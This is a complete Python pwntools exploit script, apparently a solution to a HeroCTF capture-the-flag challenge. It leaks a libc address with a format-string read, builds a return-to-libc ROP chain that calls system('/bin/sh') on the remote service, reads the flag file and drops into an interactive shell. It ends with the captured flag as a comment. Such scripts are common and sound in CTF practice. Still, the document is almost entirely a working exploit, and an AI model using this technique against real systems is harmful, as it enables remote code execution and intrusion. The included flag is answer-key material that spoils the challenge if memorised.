from pwn import *

context.arch = "amd64"

# Libc offsets (Debian 12 - sha256:3d957cd5e0693cf44cbb65aa43033fb701443df6b0afa4dcc9293c9bb7a258f9)
LIBC_START_MAIN_RET = 0x2724A
POP_RDI = 0x277E5
RET = 0x26E99
SYSTEM = 0x4C490
BINSH = 0x197031

PADDING = 40


def exploit(host="dyn04.heroctf.fr", port=10556):
    io = remote(host, port)

    # Leak libc address via format string
    io.recvuntil(b"Name :")
    io.sendline(b"%19$p")
    data = io.recvuntil(b"Description :")

    leak_line = data.split(b"\n")[1]
    leak_str = leak_line.split(b"D")[0].strip()
    leak = int(leak_str, 16)

    libc_base = leak - LIBC_START_MAIN_RET
    log.info(f"Leaked: {hex(leak)}")
    log.info(f"Libc base: {hex(libc_base)}")

    pop_rdi = libc_base + POP_RDI
    ret = libc_base + RET
    system = libc_base + SYSTEM
    binsh = libc_base + BINSH

    payload = b"A" * PADDING
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    io.sendline(payload)

    io.sendline(b"cat flag*")
    io.recvuntil(b"Hero{")
    flag = b"Hero{" + io.recvuntil(b"}")
    log.success(f"Flag: {flag.decode()}")

    io.interactive()


if __name__ == "__main__":
    exploit()

# Hero{d2d8c417232c1b8e0abc91b8a542e55259ebbac5}
